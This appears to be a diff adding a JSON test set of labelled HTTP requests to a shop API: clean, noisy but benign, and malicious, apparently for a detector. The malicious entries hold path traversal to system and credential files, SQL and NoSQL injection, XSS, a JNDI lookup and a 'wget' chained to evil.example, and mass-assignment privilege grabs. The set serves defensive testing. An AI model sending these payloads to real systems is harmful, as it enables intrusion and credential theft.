@@ -1,0 +1,2072 @@
+{
+  "clean": [
+    {
+      "id": "c01",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/1",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c02",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/2",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c03",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/3",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c04",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/4",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c05",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/5",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c06",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/6",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c07",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/7",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c08",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/8",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c09",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/9",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c10",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/10",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c11",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/11",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c12",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/12",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c13",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/13",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c14",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/14",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c15",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/15",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c16",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/16",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c17",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/17",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c18",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/18",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c19",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/19",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c20",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/20",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c21",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=1&status=open",
+      "body": null
+    },
+    {
+      "id": "c22",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=2&status=open",
+      "body": null
+    },
+    {
+      "id": "c23",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=1&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c24",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=3&status=cancelled",
+      "body": null
+    },
+    {
+      "id": "c25",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=4&status=open",
+      "body": null
+    },
+    {
+      "id": "c26",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/1",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c27",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/2",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c28",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/3",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c29",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/4",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c30",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/5",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c31",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/6",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c32",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/7",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c33",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/8",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c34",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/9",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c35",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/10",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c36",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/11",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c37",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/12",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c38",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/13",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c39",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/14",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c40",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders/15",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c41",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/2/orders",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c42",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/5/orders",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c43",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/9/orders",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c44",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/users/14/orders",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c45",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=catalog.pdf",
+      "body": null
+    },
+    {
+      "id": "c46",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=guide.pdf",
+      "body": null
+    },
+    {
+      "id": "c47",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=invoice-100.pdf",
+      "body": null
+    },
+    {
+      "id": "c48",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=banner.png",
+      "body": null
+    },
+    {
+      "id": "c49",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=terms.txt",
+      "body": null
+    },
+    {
+      "id": "c50",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "notebook",
+        "qty": 1
+      }
+    },
+    {
+      "id": "c51",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "mug",
+        "qty": 2
+      }
+    },
+    {
+      "id": "c52",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "lamp",
+        "qty": 1
+      }
+    },
+    {
+      "id": "c53",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "pen",
+        "qty": 5
+      }
+    },
+    {
+      "id": "c54",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "chair",
+        "qty": 1
+      }
+    },
+    {
+      "id": "c55",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "desk",
+        "qty": 1
+      }
+    },
+    {
+      "id": "c56",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "book",
+        "qty": 1,
+        "note": "Gift for Dana."
+      }
+    },
+    {
+      "id": "c57",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "scarf",
+        "qty": 1,
+        "note": "Please include a receipt."
+      }
+    },
+    {
+      "id": "c58",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "cup",
+        "qty": 1,
+        "note": "Leave at the front desk."
+      }
+    },
+    {
+      "id": "c59",
+      "label": "clean",
+      "method": "PATCH",
+      "path": "/api/users/4",
+      "query": "",
+      "body": {
+        "display_name": "Ada",
+        "email": "ada@example.com"
+      }
+    },
+    {
+      "id": "c60",
+      "label": "clean",
+      "method": "PATCH",
+      "path": "/api/users/4",
+      "query": "",
+      "body": {
+        "display_name": "Ben",
+        "email": "ben@example.com"
+      }
+    },
+    {
+      "id": "c61",
+      "label": "clean",
+      "method": "PATCH",
+      "path": "/api/users/4",
+      "query": "",
+      "body": {
+        "display_name": "Chen",
+        "email": "chen@example.com"
+      }
+    },
+    {
+      "id": "c62",
+      "label": "clean",
+      "method": "PATCH",
+      "path": "/api/users/4",
+      "query": "",
+      "body": {
+        "display_name": "Noa",
+        "email": "noa@example.com"
+      }
+    },
+    {
+      "id": "c63",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "blue notebook"
+      }
+    },
+    {
+      "id": "c64",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "office lamp"
+      }
+    },
+    {
+      "id": "c65",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "cotton scarf"
+      }
+    },
+    {
+      "id": "c66",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "black pen"
+      }
+    },
+    {
+      "id": "c67",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "wooden desk"
+      }
+    },
+    {
+      "id": "c68",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "ceramic mug"
+      }
+    },
+    {
+      "id": "c69",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 3,
+        "text": "Arrived on time."
+      }
+    },
+    {
+      "id": "c70",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 6,
+        "text": "Box was intact."
+      }
+    },
+    {
+      "id": "c71",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 11,
+        "text": "Thanks for the fast shipping."
+      }
+    },
+    {
+      "id": "c72",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 2,
+        "text": "Color matches the photo."
+      }
+    },
+    {
+      "id": "c73",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=5&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c74",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=6&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c75",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=7&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c76",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=8&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c77",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=9&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c78",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/orders",
+      "query": "page=10&status=shipped",
+      "body": null
+    },
+    {
+      "id": "c79",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments",
+      "query": "page=1",
+      "body": null
+    },
+    {
+      "id": "c80",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments",
+      "query": "page=2",
+      "body": null
+    },
+    {
+      "id": "c81",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments",
+      "query": "page=3",
+      "body": null
+    },
+    {
+      "id": "c82",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments/1",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c83",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments/2",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c84",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments/3",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c85",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments/4",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c86",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/payments/5",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c87",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/payments",
+      "query": "",
+      "body": {
+        "order_id": 3,
+        "amount": 18.5,
+        "currency": "USD"
+      }
+    },
+    {
+      "id": "c88",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/payments",
+      "query": "",
+      "body": {
+        "order_id": 8,
+        "amount": 42,
+        "currency": "ILS"
+      }
+    },
+    {
+      "id": "c89",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/addresses",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c90",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/addresses",
+      "query": "",
+      "body": {
+        "line1": "12 Harbor St",
+        "city": "Haifa",
+        "postal_code": "3300000"
+      }
+    },
+    {
+      "id": "c91",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/tickets",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c92",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "Late delivery",
+        "body": "The package arrived a day late."
+      }
+    },
+    {
+      "id": "c93",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/tickets/4",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c94",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 6,
+        "rating": 5,
+        "title": "Great lamp"
+      }
+    },
+    {
+      "id": "c95",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/cart",
+      "query": "",
+      "body": null
+    },
+    {
+      "id": "c96",
+      "label": "clean",
+      "method": "POST",
+      "path": "/api/cart",
+      "query": "",
+      "body": {
+        "item": "notebook",
+        "qty": 2
+      }
+    },
+    {
+      "id": "c97",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/notifications",
+      "query": "unread=true",
+      "body": null
+    },
+    {
+      "id": "c98",
+      "label": "clean",
+      "method": "GET",
+      "path": "/api/notifications",
+      "query": "unread=false",
+      "body": null
+    }
+  ],
+  "suspicious": [
+    {
+      "id": "b01",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/health",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b02",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/metrics",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b03",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/ready",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b04",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/ping",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b05",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/version",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b06",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/docs",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b07",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/changelog",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b08",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/status",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b09",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/support/hours",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b10",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/stores/nearby",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b11",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/receipts/lookup",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b12",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/files/preview",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b13",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/search/suggest",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b14",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/comments/guidelines",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b15",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/users/42/preferences",
+      "query": "",
+      "body": null,
+      "note": "ordinary undeclared path"
+    },
+    {
+      "id": "b16",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "notebook",
+        "qty": 1,
+        "gift_wrap": true,
+        "card_message": "Happy birthday, Sam."
+      },
+      "note": "gift fields"
+    },
+    {
+      "id": "b17",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "mug",
+        "qty": 2,
+        "note": "It's a gift; please include a receipt.",
+        "loyalty_id": "A-19"
+      },
+      "note": "loyalty id"
+    },
+    {
+      "id": "b18",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 12,
+        "text": "Please don't leave it in the rain; the box says fragile.",
+        "channel": "sms"
+      },
+      "note": "sms channel"
+    },
+    {
+      "id": "b19",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 8,
+        "text": "Version..final of the packing photo is attached.",
+        "photo_name": "packing-final.jpg"
+      },
+      "note": "photo name"
+    },
+    {
+      "id": "b20",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "email ann+shop@example.com about order 4412",
+        "hint": "refund"
+      },
+      "note": "search hint"
+    },
+    {
+      "id": "b21",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 6,
+        "rating": 5,
+        "title": "Great lamp",
+        "locale": "he-IL"
+      },
+      "note": "review locale"
+    },
+    {
+      "id": "b22",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "Wrong color",
+        "body": "The scarf is navy, not black.",
+        "phone": "+972-50-000-0000"
+      },
+      "note": "callback phone"
+    },
+    {
+      "id": "b23",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/addresses",
+      "query": "",
+      "body": {
+        "line1": "12 Harbor St",
+        "city": "Haifa",
+        "postal_code": "3300000",
+        "doorbell": "Cohen"
+      },
+      "note": "doorbell name"
+    },
+    {
+      "id": "b24",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/payments",
+      "query": "",
+      "body": {
+        "order_id": 3,
+        "amount": 18.5,
+        "currency": "USD",
+        "receipt_email": "dana@example.com"
+      },
+      "note": "receipt email"
+    },
+    {
+      "id": "b25",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/cart",
+      "query": "",
+      "body": {
+        "item": "pen",
+        "qty": 3,
+        "gift_note": "For the office."
+      },
+      "note": "cart gift note"
+    },
+    {
+      "id": "b26",
+      "label": "benign",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "display_name": "Sean O'Brien",
+        "timezone": "Asia/Jerusalem"
+      },
+      "note": "real surname plus timezone"
+    },
+    {
+      "id": "b27",
+      "label": "benign",
+      "method": "PATCH",
+      "path": "/api/users/7",
+      "query": "",
+      "body": {
+        "display_name": "Dana",
+        "email": "dana@example.com",
+        "locale": "he-IL"
+      },
+      "note": "profile plus locale"
+    },
+    {
+      "id": "b28",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 4,
+        "text": "The textbook chapter on UNION SELECT is confusing; I am not asking you to run it."
+      },
+      "note": "student quoting SQL"
+    },
+    {
+      "id": "b29",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "docs show /../images/logo.png as a relative public asset"
+      },
+      "note": "docs mention a relative image"
+    },
+    {
+      "id": "b30",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "example stylesheet lives at /../assets/site.css"
+      },
+      "note": "docs mention a stylesheet path"
+    },
+    {
+      "id": "b31",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 2,
+        "text": "Your help page says to open /../guides/returns.pdf"
+      },
+      "note": "customer quotes a tutorial path"
+    },
+    {
+      "id": "b32",
+      "label": "benign",
+      "method": "GET",
+      "path": "/api/files/preview",
+      "query": "name=%3Cfinal%3E%5Bv2%5D%21%24.pdf",
+      "body": null,
+      "note": "punctuation-heavy public filename"
+    },
+    {
+      "id": "b33",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "Charge <expected> && refund!",
+        "body": "I was billed 50% extra (order #4412) [eu].",
+        "order_ref": "4412"
+      },
+      "note": "punctuation-heavy but real complaint"
+    },
+    {
+      "id": "b34",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 9,
+        "rating": 4,
+        "title": "Please select the union of blue and grey options next time",
+        "recommend": "more colors"
+      },
+      "note": "review that mentions select and union in prose"
+    },
+    {
+      "id": "b35",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "O'Brien's order arrived; don't ring the bell.",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b36",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Size is 4 < 5 && the color is fine (navy).",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b37",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Tracking said 10:00-14:00; nobody was home.",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b38",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "The mug says 100% cotton by mistake [photo].",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b39",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Email me at noa+shop@example.com about this.",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b40",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Chapter 3 says UNION ALL SELECT is a teaching example only.",
+        "source": "web"
+      },
+      "note": "prose mention of UNION ALL SELECT"
+    },
+    {
+      "id": "b41",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Relative link in the PDF looks like ../images/icon.png.",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "b42",
+      "label": "benign",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 5,
+        "text": "Please wrap it; the card should read: Happy 40th!",
+        "source": "web"
+      },
+      "note": "ordinary comment that looks noisy"
+    },
+    {
+      "id": "m01",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=../../etc/passwd",
+      "body": null,
+      "note": "plain traversal"
+    },
+    {
+      "id": "m02",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=%252e%252e%252fetc%252fpasswd",
+      "body": null,
+      "note": "double-encoded traversal"
+    },
+    {
+      "id": "m03",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=..%2f..%2fwindows/win.ini",
+      "body": null,
+      "note": "encoded windows target"
+    },
+    {
+      "id": "m04",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=file:///etc/passwd",
+      "body": null,
+      "note": "stream wrapper"
+    },
+    {
+      "id": "m05",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=report.pdf%00.png",
+      "body": null,
+      "note": "null byte"
+    },
+    {
+      "id": "m06",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 3,
+        "text": "thanks ../../../../etc/shadow"
+      },
+      "note": "traversal in a comment"
+    },
+    {
+      "id": "m07",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "please open ../../etc/hosts"
+      },
+      "note": "traversal in search"
+    },
+    {
+      "id": "m08",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "file",
+        "body": "see ....//....//etc/passwd"
+      },
+      "note": "obfuscated traversal"
+    },
+    {
+      "id": "m09",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 1,
+        "rating": 1,
+        "title": "/../etc/passwd"
+      },
+      "note": "traversal in a title"
+    },
+    {
+      "id": "m10",
+      "label": "malicious",
+      "method": "GET",
+      "path": "/api/files",
+      "query": "name=%2e%2e%2f%2e%2e%2fproc/self/environ",
+      "body": null,
+      "note": "encoded proc path"
+    },
+    {
+      "id": "m11",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/orders",
+      "query": "",
+      "body": {
+        "item": "x' OR 1=1 --",
+        "qty": 1
+      },
+      "note": "sql tautology in item"
+    },
+    {
+      "id": "m12",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "notebook' OR '1'='1' --"
+      },
+      "note": "sql tautology in search"
+    },
+    {
+      "id": "m13",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 1,
+        "text": "hi' UNION SELECT password FROM users --"
+      },
+      "note": "union select"
+    },
+    {
+      "id": "m14",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "${jndi:ldap://evil.example/a}"
+      },
+      "note": "jndi lookup"
+    },
+    {
+      "id": "m15",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/comments",
+      "query": "",
+      "body": {
+        "order_id": 1,
+        "text": "ok; wget http://evil.example/x"
+      },
+      "note": "command chaining"
+    },
+    {
+      "id": "m16",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/search",
+      "query": "",
+      "body": {
+        "query": "{\"$ne\": 1}"
+      },
+      "note": "nosql operator"
+    },
+    {
+      "id": "m17",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/reviews",
+      "query": "",
+      "body": {
+        "order_id": 2,
+        "rating": 1,
+        "title": "<script>alert(1)</script>"
+      },
+      "note": "script tag"
+    },
+    {
+      "id": "m18",
+      "label": "malicious",
+      "method": "POST",
+      "path": "/api/tickets",
+      "query": "",
+      "body": {
+        "subject": "help",
+        "body": "'; DROP TABLE orders; --"
+      },
+      "note": "stacked sql"
+    },
+    {
+      "id": "m19",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "display_name": "Ann",
+        "role": "admin"
+      },
+      "note": "role"
+    },
+    {
+      "id": "m20",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "email": "a@b.c",
+        "is_admin": true,
+        "balance": 1000000
+      },
+      "note": "admin and balance"
+    },
+    {
+      "id": "m21",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "display_name": "Sam",
+        "owner_id": 1
+      },
+      "note": "owner swap"
+    },
+    {
+      "id": "m22",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "email": "x@y.z",
+        "permissions": [
+          "*"
+        ]
+      },
+      "note": "wildcard permissions"
+    },
+    {
+      "id": "m23",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
+        "display_name": "Eve",
+        "verified": true
+      },
+      "note": "forced verification"
+    },
+    {
+      "id": "m24",
+      "label": "malicious",
+      "method": "PATCH",
+      "path": "/api/users/42",
+      "query": "",
+      "body": {
